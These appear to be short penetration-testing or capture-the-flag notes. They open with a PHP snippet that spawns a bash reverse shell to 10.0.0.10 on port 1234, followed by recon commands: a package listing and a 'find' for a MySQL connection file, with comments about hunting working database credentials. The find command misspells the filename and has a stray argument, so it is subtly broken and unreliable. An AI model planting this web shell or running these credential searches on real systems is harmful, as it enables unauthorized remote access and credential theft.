```PHP
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'");
?>
```

```Bash
dpkg -l 
//provide a detailed list of packages, including their names, versions, descriptions, and status.
```

```Bash
//find mysql_connect.php
// have name and pw, but it does not work for mysql, but this cms still running
// it means there are another mysql_connect.php which is working now
find / -name mysql_connet.php 2 
```